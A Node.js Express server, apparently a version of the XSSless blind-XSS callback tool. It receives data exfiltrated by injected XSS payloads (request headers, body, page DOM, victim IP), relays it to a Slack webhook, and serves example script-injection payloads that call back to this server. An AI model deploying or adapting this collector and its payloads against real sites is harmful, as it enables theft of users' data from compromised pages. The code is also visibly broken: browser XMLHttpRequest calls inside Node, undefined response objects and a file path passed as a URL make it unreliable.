const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const process = require("process");
const request = require("request");
const path = require("path");
require("dotenv").config();

var port = process.env.PORT || 3000;
var imgbb_api_key = process.env.IMGBB_API_KEY;
var slack_incoming_webhook = process.env.SLACK_INCOMING_WEBHOOK;

var app = express();
app.use(cors());
app.use(bodyParser.json({ limit: "15mb" }));
app.use(bodyParser.urlencoded({ limit: "15mb", extended: true }));

app.use((req, res, next) => {
    res.header("Powered-By", "XLESS");
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Methods", "GET,POST");
    res.header("Access-Control-Allow-Headers", "Content-Type");
    res.header("Access-Control-Allow-Credentials", "True");
    next();
});

function generateBlindXssAlert(body) {
    var alert = "*XSSless: Blind XSS Alert*\n";
    for (var k in body) {
        if (k === "DOM") {
            body[k] = `\n\nhello ${body[k]}\n\n`;
        }
        alert += body[k] === "" ? `*${k}:* \`\`\`None\`\`\`\n` : `*${k}:* \n\`\`\`${body[k]}\`\`\`\n`;
    }
    return alert;
}

function generateCallbackAlert(headers, data, url) {
    var alert = "*XSSless: Out-of-Band Callback Alert*\n";
    alert += `• *IP Address:* \`${data["Remote IP"]}\`\n`;
    alert += `• *Request URI:* \`${url}\`\n`;
    for (var key in headers) {
        if (headers.hasOwnProperty(key)) {
            alert += `• *${key}:* \`${headers[key]}\`\n`;
        }
    }
    for (var key in data) {
        if (data.hasOwnProperty(key)) {
            alert += `• *${key}:* \`${data[key]}\`\n`;
        }
    }
    return alert;
}

function generateMessageAlert(body) {
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open("get", "http://localhost:80", true);
    req.withCredentials = true;
    req.send();
}

async function sendSlackAlert(req, data) {
    data["Remote IP"] = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    var alert = generateBlindXssAlert(data);
    data = {
        form: {
            payload: JSON.stringify({ username: "XLess", mrkdwn: true, text: alert }),
        },
    };
    request.post(slack_incoming_webhook, data, (out) => {
        res.send("ok\n");
        res.end();
    });
}

app.get("/examples", (req, res) => {
    res.header("Content-Type", "text/plain");
    const url = `https://${req.headers["host"]}`;
    const page = `
        <script>
            var xhr = new XMLHttpRequest();
            xhr.open('GET', '${url}', true);
            xhr.send();
        </script>
        <script>
            var script = document.createElement('script');
            script.src = '${url}';
            document.body.appendChild(script);
        </script>`;
    res.send(page);
    res.end();
});

app.all("/message", (req, res) => {
    var message = req.query.text || req.body.text;
    var alert = generateMessageAlert(message);
    var data = {
        form: {
            payload: JSON.stringify({ username: "XLess", mrkdwn: true, text: alert }),
        },
    };
    request.post(slack_incoming_webhook, data, (out) => {
        res.send("ok\n");
        res.end();
    });
});

app.all("/*", (req, res) => {
    var headers = req.headers;
    var data = req.body;
    data["Remote IP"] = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    var alert = generateCallbackAlert(headers, data, req.url);
    var data = {
        form: {
            payload: JSON.stringify({ username: "XLess", mrkdwn: true, text: alert }),
        },
    };
    request.post(slack_incoming_webhook, data, (out) => {
        request(path.join(__dirname + "/payload.js"), (err, res) => {
            res.send("ok\n");
            res.end();
        });
    });
});

app.listen(port, (err) => {
    if (err) throw err;
    console.log(`> Ready On Server http://localhost:${port}`);
});
